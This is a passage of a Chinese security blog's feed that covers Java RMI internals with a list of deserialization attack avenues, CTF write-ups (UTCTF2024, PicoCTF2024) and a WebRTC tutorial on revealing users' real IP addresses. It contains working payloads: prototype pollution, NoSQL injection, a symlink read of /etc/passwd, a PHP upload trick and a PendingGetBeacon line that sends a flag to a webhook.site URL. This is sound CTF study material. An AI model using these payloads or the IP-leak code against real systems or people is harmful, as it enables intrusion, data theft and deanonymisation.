+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711897003866-5c1fdb41-5c6e-4210-882a-ece4a473f702.png" alt="image.png" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711897015571-6796140d-101c-427c-a23e-88f6ec4daed5.png" alt="image.png" loading="lazy"></p>
+<p>这里的<strong>skel</strong>其实就是实例化的<strong>RegistryImpl_Skel</strong>，<strong>RegistryImpl_Skel</strong>使用的是<strong>java.rmi.server.Skeleton</strong>接口，实现了<strong>dispatch</strong>方法来分发具体的操作。<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711897356746-c12e8971-3f9e-4948-8129-ce045678103f.png" alt="image.png" loading="lazy"></p>
+<p>后续<strong>Target</strong>的导出就和远程对象的那一块没什么区别了。</p>
+<p>于远程对象创建做个类比：</p>
+<ul>
+<li>手写远程对象继承于<strong>UnicastRemoteObject</strong>；注册中心则直接使用的<strong>RegistryImpl</strong></li>
+<li>远程对象的存根是使用<strong>RemoteObjectInvocationHandler</strong>的动态代理；注册中心的存根是反射创建的<strong>RegistryImpl_Stub</strong></li>
+<li>远程对象封装的<strong>UnicastServerRef</strong>中<strong>Skel</strong>为空；注册中心的则是<strong>RegistryImpl_Skel</strong></li>
+</ul>
+<h2 id="bindlookup">bind/lookup</h2>
+<h3 id="注册中心获取">注册中心获取</h3>
+<p>Server的<code>Naming.bind(&quot;rmi://localhost:1099/Hello&quot;, remoteObject)</code>在绑定远程对象前，和Client一样，都先调用了<code>LocateRegistry.getRegistry(&quot;localhost&quot;, 1099)</code>获取注册表。其中会调用<strong>sun.rmi.server.Util#createProxy</strong>也就是之前创建stub的方法，创建一个<strong>RegistryImpl_Stub</strong>返回。<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711899939115-8fe021db-f16f-4934-8b43-c385377fed5b.png" alt="image.png" loading="lazy"></p>
+<h3 id="bind">bind</h3>
+<p><strong>RegistryImpl_Stub.bind</strong>大致可以分为三步：</p>
+<ol>
+<li>创建远程调用：调用<code>sun.rmi.server.UnicastRef#newCall</code>实例化一个<strong>StreamRemoteCall</strong>对象并返回，它用于处理RMI客户端与服务端之间的远程调用过程中的序列化（编组）和反序列化（解组）的流操作。创建的时候指定的操作数，0表示bind一个远程对象。</li>
+<li>序列化参数：获取RemoteCall的输出流（<code>ObjectOutput var4 = var3.getOutputStream();</code>），并将要绑定的名称（var1）和远程对象（var2）序列化到这个流中。这个过程是将Java对象转换为可以通过网络传输的字节流的过程，称为编组（marshalling）。</li>
+<li>执行远程调用：使用<code>super.ref.invoke(var3)</code>调用在远程引用上执行远程方法调用。这个步骤实际上是将之前编组的参数发送到远程RMI注册表服务，并请求执行bind操作。</li>
+</ol>
+<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/javarmi1/1711902565270-4df28789-64f1-41e7-af90-6bbbd6517842.png" alt="image.png" loading="lazy"></figure>
+<p>（次日补充：<br>
+如果按照这里代码所示，在注册中心绑定的应该是这个远程类的实现类。但实际上绑定的是这个类的一个代理类，其结构如下：<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711961744635-3a9ace0d-8787-4a80-8d2b-5351ec108371.png" alt="image.png" loading="lazy"></p>
+<p>按照文章中的说法，在实例化<strong>StreamRemoteCall</strong>的时候会调用<code>marshalCustomCallData</code>方法，这个方法是设计来序列化（编组）自定义的调用数据到输出流中的。引用文中的图片和描述</p>
+<blockquote>
+<p>使用 sun.rmi.server.MarshalOutputStream 封装后会使用动态代理类来替换原始类。<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711961976285-aab5a303-b831-43bb-929e-8c236cf92fcf.png" alt="image.png" loading="lazy"></p>
+</blockquote>
+<p>不过我所调试的源码中<code>marshalCustomCallData</code>没有实现任何内容<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711962083536-f150ae2b-94e0-47df-8a25-18e842ca231b.png" alt="image.png" loading="lazy"></p>
+<p>奇怪的是最后注册表收到的类，还是这个远程类的代理类。可能是Java版本的原因（我所用的是JDK 1.8.0_65），这里暂不深究<br>
+）</p>
+<p>当传入<code>sun.rmi.server.UnicastRef#invoke</code>的参数为<strong>RemoteCall</strong>类型时，会直接调用它的<code>executeCall</code>方法<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711903259095-369500f6-87db-44b4-8563-f77379488af4.png" alt="image.png" loading="lazy"></p>
+<p>在这里面会调用<code>releaseOutputStream()</code>释放输出流，它标志着发送给远程对象的数据已经完成序列化并被发送出去；接着会调用<code>getInputStream()</code>来从网络连接接收数据。<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711903287620-25e4e206-0141-4837-81f3-383a1778a49f.png" alt="image.png" loading="lazy"></p>
+<p>在 <strong>Registry</strong> 端，由 <code>sun.rmi.transport.tcp.TCPTransport#handleMessages </code>来处理请求，调用 <code>serviceCall</code> 方法处理。<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711903573254-ea0eb4b4-592a-48a1-9b84-65168e32e6f8.png" alt="image.png" loading="lazy"></p>
+<p><code>serviceCall</code> 方法中从 <strong>ObjectTable</strong> 中获取封装的 <code>Target</code> 对象，并获取其中的封装的 <strong>UnicastServerRef</strong> 以及 <strong>RegistryImpl</strong> 对象。然后调用 <strong>UnicastServerRef</strong> 的 <code>dispatch</code> 方法<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711903759350-addd7012-6c98-4604-b7c8-d1bc996a3198.png" alt="image.png" loading="lazy"></p>
+<p><strong>UnicastServerRef</strong> 的 <code>dispatch</code> 方法调用 <code>oldDispatch</code> 方法，这里判断了 <code>this.skel</code> 是否为空，用来区别自己是 <strong>Registry</strong> 还是 <strong>Server</strong>。<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711903892067-465bb438-a65e-4a2b-b010-406dc405c6f2.png" alt="image.png" loading="lazy"></p>
+<p>在<code>oldDispatch</code>中会调用<strong>RegistryImpl_Skel</strong> 的 <code>dispatch</code>。<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711904200696-9f0fe3e8-3a1c-419c-9045-97f4b5b746cc.png" alt="image.png" loading="lazy"></p>
+<p><strong>RegistryImpl_Skel</strong> 的 <code>dispatch</code>会反序列化远程对象以及它的名称，然后调用 <strong>RegistryImpl</strong> 的<code>bind</code>方法<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711904416949-001aaa3c-882d-4d77-8388-47bde09466e4.png" alt="image.png" loading="lazy"></p>
+<p>最终会在 <strong>RegistryImpl</strong>的 bindings 上添加远程对象的信息<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711904621048-0bae97d2-cc6b-4b93-b7d6-154ab82cb09b.png" alt="image.png" loading="lazy"></p>
+<h3 id="lookup">lookup</h3>
+<p>客户端调用的<code>lookup</code>，其实是<strong>RegistryImpl_Stub</strong>的<code>lookup</code>。这个流程和上面<code>bind</code>的类似，首先会创建一个<code>RemoteCall</code>指定操作数为2，也就是lookup。接着会将要查找对象名称序列化后写入流，注册中心查找对应的stub，序列化之后返回给客户端。客户端反序列化之后返回这个stub。<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711957115558-05dad9db-a125-4ba3-ae11-84c5903c9baa.png" alt="image.png" loading="lazy"></p>
+<p>在<strong>RegistryImpl_Skel</strong>的<code>dispatch</code>中看下<code>lookup</code>，也就是switch 2的处理方式。调用的是<strong>RegistryImpl</strong>的<code>lookup</code>，也就是从<code>bindings</code>中获取对应的代理类。再将这个类序列化写入流，由客户端接受。<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711957330607-e721394d-3db8-43ef-95dc-c91b8b4492ef.png" alt="image.png" loading="lazy"></p>
+<p>客户端获取的stub<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711962690177-04b9b194-7f56-4b57-8d08-6803ec7430ea.png" alt="image.png" loading="lazy"></p>
+<h2 id="调用">调用</h2>
+<p>客户端调用远程对象方法的时候，就是通过 **RemoteObjectInvocationHandler **的 <code>invoke</code> 方法。<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711972157896-c579d148-e924-4e13-8a0a-073fc07a2405.png" alt="image.png" loading="lazy"></p>
+<p><strong>RemoteObjectInvocationHandler</strong>的 <code>invokeRemoteMethod</code> 会调用自身 <strong>UnicastRef</strong>的 <code>invoke</code> 方法，它接受远程对象的代理（<strong>proxy</strong>）、调用的方法（<strong>method</strong>）、参数（<strong>args</strong>）和方法的哈希（<strong>getMethodHash(method)</strong>）。<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711972671829-4a507efd-a24a-427e-89ef-0539adad853a.png" alt="image.png" loading="lazy"></p>
+<p><strong>UnicastRef</strong>的 <code>invoke</code> 方法会先于服务端绑定这个远程对象的端口建立，执行调用，读取结果并反序列化。<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711973066511-f2c969e4-c500-49d1-8682-db69d374eec5.png" alt="image.png" loading="lazy"></p>
+<p>反序列化的方法在后面的<code>unmarshalValue</code>中，可以看到除了基础类型（不包含String），都会对返回对象进行反序列化操作。<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711973130095-482f7796-6c80-4586-b3c5-c1247a2e3acf.png" alt="image.png" loading="lazy"></p>
+<p>和 <strong>RegistryImpl_Stub</strong>调用流程相似，服务端首先根据连接的信息从 <strong>ObjectTable</strong> 找到 <strong>Target</strong>，再用 <code>getDispatcher</code> 获得其中的 <strong>UnicastServerRef</strong>，并调用 <strong>UnicastServerRef</strong>的 <code>dispatch</code> 方法来处理。</p>
+<p>在这里可以看到，由于是远程对象调用，操作数为-1，就不再走skel的处理逻辑了<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711974770832-643d7042-7b7f-4d82-a22b-1e16fdc8fa8f.png" alt="image.png" loading="lazy"></p>
+<p>调用方法前会先检查要调用的方法存不存在，如果存在则调用<code>unmarshalValue</code>反序列化出参数，然后反射调用方法<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711974967664-668aaac4-f8ab-425b-b6ab-35547f55175e.png" alt="image.png" loading="lazy"></p>
+<p>然后将调用结果序列化返回给客户端<br>
+<img src="https://skyblu3519.github.io/post-images/javarmi1/1711975193013-5c704223-8427-4b2b-98eb-a2772fbde417.png" alt="image.png" loading="lazy"></p>
+<h1 id="小结">小结</h1>
+<p>现在对rmi大致的工作流程有个了解了。</p>
+<p>主要是代表客户端 <strong>stub</strong>的调用方式，而注册中心 <strong>Registry</strong>就相当于在基础的 <strong>stub</strong> 和 <strong>UnicastServerRef</strong> 的通信流程上多了一点东西。</p>
+<p>从这个流程我们也知道了，Server，Registry 和 Client 之间的通讯均是由反序列化实现的，也就说明针对三端都有攻击的可能。</p>
+<p>具体的攻击方法先大致看了一遍，具体流程等之后有时间再做了，这里先记一下。</p>
+<p><strong>攻击Server端：</strong></p>
+<ul>
+<li>恶意序列化对象作为参数传入
+<ul>
+<li>如何参数不是Object类型，可以通过修改传入方法Hash来匹配。总结：Server 端的调用方法存在非基础类型的参数时，就可以被恶意 Client 端传入恶意数据流触发反序列化漏洞。</li>
+</ul>
+</li>
+<li>动态类加载：通过<code>this.readLocation()</code>方法读取流中序列化的 <code>java.rmi.server.codebase</code> 地址让服务端再远程加载恶意类</li>
+</ul>
+<p><strong>攻击 Registry 端：</strong></p>
+<ul>
+<li>在 <strong>Server</strong> 端向 <strong>Registry</strong> 端提交 <code>bind</code> 的远程对象时，<strong>Registry</strong> 会反序列化这个对象存放到 <code>bindings</code> 中。所以 <strong>Server</strong> 端可以提交一个恶意类，需要是 <strong>Remote</strong> 类型（用 <strong>AnnotationInvocationHandler</strong> 来做）</li>
+</ul>
+<p><strong>攻击 Client 端：</strong></p>
+<ul>
+<li>恶意 Server Stub：同攻击 Registry 端，Client 端在 Registry 端 lookup 后会拿到一个 Server 端注册在 Registry 端的代理对象并反序列化触发漏洞。</li>
+<li>恶意 Server 端返回值：同攻击 Server 端的恶意服务参数，Server 端返回给 Client 端恶意的返回值，Client 端反序列化触发漏洞，不再赘述。</li>
+<li>动态类加载：同攻击 Server 端的动态类加载，Server 端返回给 Client 端不存在的类，要求 Client 端去 codebase 地址远程加载恶意类触发漏洞，不再赘述。</li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[UTCTF2024 Schrödinger + Easy Mergers]]></title>
+        <id>https://skyblu3519.github.io/post/utctf2024-schrodinger-easy-mergers/</id>
+        <link href="https://skyblu3519.github.io/post/utctf2024-schrodinger-easy-mergers/">
+        </link>
+        <updated>2024-04-01T15:15:19.000Z</updated>
+        <content type="html"><![CDATA[<p>水</p>
+<h1 id="easy-mergers-v01">Easy Mergers v0.1</h1>
+<p>服务器会在<code>userCompanies</code>中为每一个session创建一个数组<br>
+<img src="https://skyblu3519.github.io/post-images/utctf2024/1711782021147-8ee2c8f2-ffe8-4448-89d1-19e91007da6f.png" alt="image.png" loading="lazy"></p>
+<p>在<code>/api/makeCompany</code>可以为当前的<code>userCompanies[req.session.uid]</code>根据传入<code>data</code>的<code>attributes</code>和<code>values</code>创建一个对象插入到数组中<br>
+<img src="https://skyblu3519.github.io/post-images/utctf2024/1711782128877-addca498-3afe-419d-a1d0-440de39bf9ae.png" alt="image.png" loading="lazy"></p>
+<p>随便创建一个，在<code>/api/getAll</code>中查看<br>
+<img src="https://skyblu3519.github.io/post-images/utctf2024/1711782259312-03440e7d-106f-4daf-ad04-463894e447d9.png" alt="image.png" loading="lazy"></p>
+<p><code>/api/absorbCompany/:cid</code>可以传入的<code>data</code>修改<code>userCompanies[req.session.uid][cid]</code>，具体做法在<code>merger.js</code><br>
+<img src="https://skyblu3519.github.io/post-images/utctf2024/1711782509461-f9808efb-8348-45ef-899c-d7b3204627b4.png" alt="image.png" loading="lazy"></p>
+<p>修改的部分存在原型链污染，使用下面的<code>data</code>污染secret执行命令</p>
+<pre><code class="language-json">{&quot;attributes&quot;: [&quot;__proto__&quot;], &quot;values&quot;:[{&quot;cmd&quot;:&quot;ls&quot;}]}
+</code></pre>
+<p>getflag<br>
+<img src="https://skyblu3519.github.io/post-images/utctf2024/1711782177532-3ec7495b-909a-4f6c-8cd7-f6d2d38e2bb7.png" alt="image.png" loading="lazy"></p>
+<h1 id="schrödinger">Schrödinger</h1>
+<p>尝试使用压缩软链接文件上传</p>
+<pre><code class="language-json">ln -s /etc/passwd s
+</code></pre>
+<p>成功读取<br>
+<img src="https://skyblu3519.github.io/post-images/utctf2024/1711787133698-d88c49e3-baf7-4bbd-a4b5-65d45b8d006b.png" alt="image.png" loading="lazy"></p>
+<p>读<code>/proc/self/environ</code>查看进程环境变量，找到工作目录<code>HOME=/home/copenhagen</code>。根据题目描述，推测flag是用户目录下的flag.txt文件。</p>
+<blockquote>
+<p>He'll likely be in the user's home directory.<br>
+You'll know he's fine if you find a &quot;flag.txt&quot; file.</p>
+</blockquote>
+<p>生成一个/home/copenhagen/flag.txt的软链接上传，getflag<br>
+<img src="https://skyblu3519.github.io/post-images/utctf2024/1711787648438-750ced79-c2d0-4ab8-87ab-3269d632cc74.png" alt="image.png" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[PicoCTF2024 WEB WP]]></title>
+        <id>https://skyblu3519.github.io/post/picoctf2024-web-wp/</id>
+        <link href="https://skyblu3519.github.io/post/picoctf2024-web-wp/">
+        </link>
+        <updated>2024-04-01T15:11:35.000Z</updated>
+        <content type="html"><![CDATA[<p>这篇文章目的是记住elements这道题，其他就是水！</p>
+<h1 id="elements">elements</h1>
+<p>WP参考：<a href="https://github.com/satoki/ctf_writeups/tree/master/picoCTF_2024/elements">https://github.com/satoki/ctf_writeups/tree/master/picoCTF_2024/elements</a></p>
+<p>这题考的是在一个有很多限制条件下，如何用js的eval执行代码向外部发送一条请求。</p>
+<p><strong>限制：CSP</strong></p>
+<p>CSP背景：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP</a></p>
+<p>CSP绕过：<a href="https://book.hacktricks.xyz/v/cn/pentesting-web/content-security-policy-csp-bypass">https://book.hacktricks.xyz/v/cn/pentesting-web/content-security-policy-csp-bypass</a></p>
+<pre><code class="language-javascript">const csp =  [
+  &quot;default-src 'none'&quot;,
+  &quot;style-src 'unsafe-inline'&quot;,
+  &quot;script-src 'unsafe-eval' 'self'&quot;,
+  &quot;frame-ancestors 'none'&quot;,
+  &quot;worker-src 'none'&quot;,
+  &quot;navigate-to 'none'&quot;
+]
+</code></pre>
+<p>其实default-src 'none'就拦了一大堆东西了，我比较好奇的是：</p>
+<ul>
+<li>为什么使用<code>location.herf</code>和<code>window.herf</code>没用</li>
+<li><code>navigate-to 'none'</code>这个我看限制了<code>window.open</code>，<code>window.herf</code>还有<code>form</code>表单提交但我在用自己浏览器做实验的时候，这条规则并没有起效果。</li>
+<li>还有也不能用<code>meta</code>标签的<code>refresh</code>跳转</li>
+</ul>
+<p>这些疑惑大概率会在我Windows的kali虚拟机上安装好题目给的Chromium浏览器得到解决，不过有空再说吧～</p>
+<p>(Ps.关于之前PearlCTF那道Learn HTTP，原来在Chromium里面script-src 'self'就是不能让js直接在页面上执行😂<br>
+<img src="https://skyblu3519.github.io/post-images/picoctf2024/1711983025946-14262a49-b433-4d27-98f2-2ae2db2098b3.png" alt="image.png" loading="lazy"></p>
+<p><strong>限制：WebRTC</strong></p>
+<p>题目给的diff文件给出信息：RTCPeerConnection 和 webkitRTCPeerConnection 不可用。</p>
+<pre><code class="language-diff">diff --git a/third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.idl b/third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.idl
+index f0948629cb..393e7c77e0 100644
+--- a/third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.idl
++++ b/third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.idl
+@@ -61,10 +61,7 @@ enum RTCPeerConnectionState {
+ // https://w3c.github.io/webrtc-pc/#interface-definition
+
+ [
+-    ActiveScriptWrappable,
+-    Exposed=Window,
+-    LegacyWindowAlias=webkitRTCPeerConnection,
+-    LegacyWindowAlias_Measure
++    ActiveScriptWrappable
+ ] interface RTCPeerConnection : EventTarget {
+     // TODO(https://crbug.com/1318448): Deprecated `mediaConstraints` should be removed.
+     [CallWith=ExecutionContext, RaisesException] constructor(optional RTCConfiguration configuration = {}, optional GoogMediaConstraints mediaConstraints);
+</code></pre>
+<p>借着机会了解下WebRTC，可以用下面的代码发起一次DNS解析（类似DNS Prefetch）</p>
+<pre><code class="language-javascript">(async () =&gt; { p = new RTCPeerConnection({ iceServers: [{ urls: &quot;stun:LEAK.dnsbin&quot; }] }); p.createDataChannel(''); p.setLocalDescription(await p.createOffer()) })()
+</code></pre>
+<p><strong>限制：DNS Prefetch</strong></p>
+<p>限制的方法用的是这段代码</p>
+<pre><code class="language-javascript">	const userDataDir = await mkdtemp(join(tmpdir(), 'elements-'));
+
+	await mkdir(join(userDataDir, 'Default'));
+	await writeFile(join(userDataDir, 'Default', 'Preferences'), JSON.stringify({
+		net: {
+			network_prediction_options: 2
+		}
+	}));
+</code></pre>
+<p>利用DNS Prefetch的代码</p>
+<pre><code class="language-javascript">const linkEl = document.createElement('link');
+linkEl.rel = 'dns-prefetch';
+linkEl.href = urlWithYourPreciousData;
+document.head.appendChild(linkEl);
+</code></pre>
+<p>总之，限制了一大推最后关注到的是，发起请求时Chromium的启动参数：<code>--enable-experimental-web-platform-features</code></p>
+<p>这个允许Chromium具有一些实验特性，而查看最近的版本信息，发现了<code>PendingGetBeacon</code>这个API，最后执行一个这样的代码即可</p>
+<pre><code class="language-python">myhook = &quot;https://webhook.site/820aeb64-ea79-49de-9ca6-93ce0566a985/${state.flag.slice(0, -1)}&quot;
+xss = f&quot;beacon = new PendingGetBeacon(`{myhook}`, {{timeout: 1000}});&quot;
+</code></pre>
+<h1 id="bookmarklet">Bookmarklet</h1>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/picoctf2024/1710300377020-326bcdbe-59d5-4ad5-a36d-80f126c716f5.png" alt="image.png" loading="lazy"></figure>
+<h1 id="webdecode">WebDecode</h1>
+<ul>
+<li>进入<code>/about.html</code></li>
+<li>F12</li>
+<li>发现base64编码内容</li>
+<li>解码</li>
+</ul>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/picoctf2024/1710300924097-dd8db8f3-a850-45cd-b42f-4c3592dbe1dc.png" alt="image.png" loading="lazy"></figure>
+<h1 id="no-sql-injection">No Sql Injection</h1>
+<ul>
+<li>flag在表中的token字段</li>
+<li>构造查询条件时，如果password和email是json格式会将其解析</li>
+<li>NoSQL注入一个永真查询：User.find({'email':{<span class='katex-error' title='ParseError: KaTeX parse error: Expected &#039;EOF&#039;, got &#039;}&#039; at position 5: ne:1}̲, &#039;password&#039;:{'>ne:1}, &#039;password&#039;:{</span>ne:1}})</li>
+<li>payload构造</li>
+</ul>
+<pre><code class="language-json">{&quot;email&quot;:&quot;{\&quot;$ne\&quot;:\&quot;1\&quot;}&quot;,&quot;password&quot;:&quot;{\&quot;$ne\&quot;:\&quot;1\&quot;}&quot;}
+</code></pre>
+<p><img src="https://skyblu3519.github.io/post-images/picoctf2024/1710304495872-5baed08f-c509-4097-9716-9eadcb92651f.png" alt="image.png" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/picoctf2024/1710304595808-8180f2a0-e765-4e59-bf23-0ca004437f42.png" alt="image.png" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/picoctf2024/1710304831564-cb2e7404-a51e-4842-b592-8fd2d62e3ccf.png" alt="image.png" loading="lazy"></p>
+<h1 id="trickster">Trickster</h1>
+<ul>
+<li>文件后缀检查使用<code>.png.php</code>，内容部分添加png文件头</li>
+<li>上传命令执行代码</li>
+<li>flag在../HFQWKODGMIYTO.txt</li>
+</ul>
+<p><img src="https://skyblu3519.github.io/post-images/picoctf2024/1710308204536-ae8b31d5-ee0d-4bf7-a9f3-d057b5236821.png" alt="image.png" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/picoctf2024/1710308223028-908954e5-bc25-4332-a972-7e98f15b1c63.png" alt="image.png" loading="lazy"></p>
+<h1 id="introtoburp">IntroToBurp</h1>
+<ul>
+<li>破坏<code>/dashboard</code>提交otp参数即可让认证错误</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/picoctf2024/1710308818580-20696bf3-5ba1-428a-b56f-c2c4cf2ee3be.png" alt="image.png" loading="lazy"></figure>
+<h1 id="unminify">Unminify</h1>
+<p>F12<br>
+<img src="https://skyblu3519.github.io/post-images/picoctf2024/1710308951833-e3a51ebf-c751-465e-99cf-14ee294eb911.png" alt="image.png" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[WebRTC如何获取用户真实IP]]></title>
+        <id>https://skyblu3519.github.io/post/webrtc-ru-he-huo-qu-yong-hu-zhen-shi-ip/</id>
+        <link href="https://skyblu3519.github.io/post/webrtc-ru-he-huo-qu-yong-hu-zhen-shi-ip/">
+        </link>
+        <updated>2024-03-29T10:38:27.000Z</updated>
+        <content type="html"><![CDATA[<p>没太深入细节，仅仅当作科普看看了。</p>
+<h1 id="原理简述">原理简述</h1>
+<p>WebRTC参考：<a href="https://webrtcforthecurious.com/zh/docs/01-what-why-and-how/">给好奇者的WebRTC</a>，这个文档看前三节就可以理解为什么可以用WebRTC获取真实IP了。</p>
+<p>WebRTC要实现的是P2P的传输，如果通信的两端在一个网络还好说，但我们目的肯定是要让世界上任意两个终端通信。</p>
+<p>要让世界上不同内网的内网相互通信，用到的方法就是NAT。假如我要和远在伦敦的J先生通信的话，我就要拿到NAT为我这次通信提供的<strong>映射地址</strong>，这个<strong>映射地址</strong>是公网上的。然后在于J先生建立通信的时候，我把这个<strong>映射地址</strong>给他作为我的目标地址。</p>
+<p><strong>STUN协议</strong>就是配合NAT来实现这个过程的，它可以让用户拿到<strong>映射地址</strong>。这个过程如下：</p>
+<ul>
+<li>用户向<strong>STUN服务器</strong>发送一个 <code>STUN Binding Request</code></li>
+<li><strong>STUN服务器</strong>回应一个 <code>STUN Binding Response</code></li>
+<li>该<code>STUN Binding Response</code>将包含映射地址</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1711708746245.png" alt="" loading="lazy"></figure>
+<p>为什么说这个IP会比较“真实”，是因为STUN协议用的是UDP，而大部分代理工具只代理了TCP，这就导致了真实IP的泄露。作为一个安全狗，拿到这个IP地址之后WebRTC对我就可以说是结束了，至于什么ICE、TURN、信令了解下就可以。</p>
+<h1 id="代码实现">代码实现</h1>
+<p>方法实现参考：<a href="https://zhuanlan.zhihu.com/p/623495107?utm_id=0">WebRTC疑似可以获取你的真实IP地址</a>。</p>
+<p>获取IP的核心代码其实就下面一块：</p>
+<pre><code class="language-javascript">// 定义STUN服务器的配置，这里使用了Google的公共STUN服务器
+const iceServers = [
+    { urls: 'stun:stun.l.google.com:19302' }
+];
+
+// 函数用于获取用户的公网IP地址
+function getUserIPs(callback) {
+    // 创建一个新的RTCPeerConnection实例，传入STUN服务器配置
+    const myPeerConnection = new RTCPeerConnection({ iceServers });
+
+    // 创建一个数据通道，这在此例中主要是为了触发ICE过程
+    myPeerConnection.createDataChannel(&quot;&quot;);
+
+    // 创建一个SDP offer，启动WebRTC协商过程
+    myPeerConnection.createOffer().then(offer =&gt; 
+        // 将生成的offer设置为本地描述
+        myPeerConnection.setLocalDescription(offer)
+    );
+
+    // 当发现新的ICE候选时触发此事件处理函数
+    myPeerConnection.onicecandidate = function(event) {
+        // 检查是否存在候选信息
+        if (event.candidate) {
+            // 从ICE候选信息中提取IP地址
+            // ICE候选信息格式通常是 &quot;candidate:&lt;id&gt; &lt;generation&gt; &lt;transport&gt; &lt;priority&gt; &lt;ip&gt; &lt;port&gt; typ &lt;type&gt; ...&quot;
+            const parts = event.candidate.candidate.split(' ');
+            const ip = parts[4]; // IP地址通常位于分割后的第五个元素
+
+            // 使用回调函数返回找到的IP地址
+            callback(ip);
+        }
+    };
+}
+</code></pre>
+<p>完整代码<br>
+index.html</p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Get IP Addresses&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://unpkg.com/element-ui@2.15.6/lib/theme-chalk/index.css&quot;&gt;
+    &lt;script src=&quot;https://unpkg.com/vue@2.6.14&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://unpkg.com/element-ui@2.15.6/lib/index.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div id=&quot;app&quot;&gt;
+        &lt;el-container&gt;
+            &lt;el-header&gt;
+                &lt;h1&gt;Your IP Addresses:&lt;/h1&gt;
+            &lt;/el-header&gt;
+            &lt;el-main&gt;
+                &lt;el-table :data=&quot;ipAddresses&quot; style=&quot;width: 100%&quot; border&gt;
+                    &lt;el-table-column prop=&quot;type&quot; label=&quot;Type&quot; width=&quot;180&quot;&gt;&lt;/el-table-column&gt;
+                    &lt;el-table-column prop=&quot;address&quot; label=&quot;IP Address&quot;&gt;&lt;/el-table-column&gt;
+                &lt;/el-table&gt;
+            &lt;/el-main&gt;
+        &lt;/el-container&gt;
+    &lt;/div&gt;
+
+    &lt;script&gt;
+        new Vue({
+            el: '#app',
+            data() {
+                return {
+                    ipAddresses: [
+                        { type: 'XFF or CDN IP Address', address: 'Loading...' },
+                        { type: 'WebRTC Local IP Address', address: 'Loading...' },
+                        { type: 'WebRTC IPv4 Address', address: 'Loading...' },
+                        { type: 'WebRTC IPv6 Address', address: 'Loading...' }
+                    ]
+                };
+            },
+            mounted() {
+                // Fetch XFF or CDN IP address
+                const xhr = new XMLHttpRequest();
+                xhr.open('GET', './get_real_ip.php', true);
+                xhr.onreadystatechange = () =&gt; {
+                    if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) {
+                        const jsonResponse = JSON.parse(xhr.responseText);
+                        this.ipAddresses[0].address = jsonResponse.ip;
+                    }
+                };
+                xhr.send();
+
+                // WebRTC IPs
+                const iceServers = [
+                    { urls: 'stun:stun.l.google.com:19302' },
+                    { urls: 'stun:stun1.l.google.com:19302' },
+                    { urls: 'stun:stun2.l.google.com:19302' },
+                    { urls: 'stun:stun3.l.google.com:19302' },
+                    { urls: 'stun:stun4.l.google.com:19302' },
+                ];
+                // getUserIPs function
+                function getUserIPs(callback) {
+                    const myPeerConnection = new RTCPeerConnection({ iceServers });
+                    myPeerConnection.createDataChannel(&quot;&quot;);
+                    myPeerConnection.createOffer().then(offer =&gt; myPeerConnection.setLocalDescription(offer));
+        
+                    myPeerConnection.onicecandidate = function(event) {
+                        if (event.candidate) {
+                            const parts = event.candidate.candidate.split(' ');
+                            const ip = parts[4];
+                            callback(ip);
+                        }
+                    };
+                }
+
+                getUserIPs((ip) =&gt; {
+                    const ipv4Regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
